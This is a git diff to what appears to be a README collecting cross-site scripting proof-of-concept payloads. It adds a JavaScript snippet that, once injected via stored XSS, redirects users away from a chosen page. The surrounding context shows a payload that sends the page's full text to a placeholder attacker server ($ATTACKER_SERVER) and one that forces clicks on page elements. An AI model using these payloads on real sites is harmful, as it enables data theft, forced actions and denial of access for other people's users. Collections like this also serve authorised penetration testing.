@@ -8,6 +8,7 @@ Originally this started as just a little list of PoC payloads but it has now exp
   + [.$GET](#jquery-ajax)
 + **FORCING ACTIONS:**
   + [CLICK](#-forcing-actions)
+  + [DENYING ACTIONS](#prevent-a-user-from-accessing-a-webpage-highly-dependent-on-where-the-xss-occurs-great-for-scenarios-where-xss-is-stored-in-a-global-banner)
 + **SETTING ITEMS:**
   + [DOCUMENT.COOKIE](#via-documentcookie)
   + [WINDOW.LOCALSTORAGE](#via-windowlocalstorage)
@@ -80,6 +81,11 @@ $.get("https://$ATTACKER_SERVER/?exfil="+document.documentElement.outerText)
 ```javascript
 document.getElementById("$TARGET_ELEMENT_ID").click()
 ```
+### PREVENT A USER FROM ACCESSING A WEBPAGE (*highly dependent on where the XSS occurs. Great for scenarios where XSS is stored in a global banner*)
+```javascript
+if(window.location.pathname == "{THE_PAGE_YOU_WANT_TO_BLOCK}"){if(!window.location.search){window.location.replace("{THE_PAGE_TO_REPLACE}");}}
+```
+
 
 
 # 🏠 SETTING ITEMS
